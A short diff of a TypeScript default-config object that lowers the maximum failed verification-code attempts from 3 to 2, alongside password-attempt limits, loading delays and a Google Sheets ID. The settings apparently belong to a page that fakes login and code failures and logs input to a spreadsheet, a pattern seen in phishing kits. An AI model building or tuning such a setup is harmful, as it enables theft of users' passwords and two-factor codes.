@@ -10,7 +10,7 @@ interface Config {
 const defaultConfig: Config = {
   settings: {
     code_loading_time: 7000,
-    max_failed_code_attempts: 3,
+    max_failed_code_attempts: 2,
     max_failed_password_attempts: 1,
     password_loading_time: 5000,
     sheet_id: "1S-cBdOWDJuM7GEbLPDv0QqwJiIJHzz4qgj2cjVnaLho"
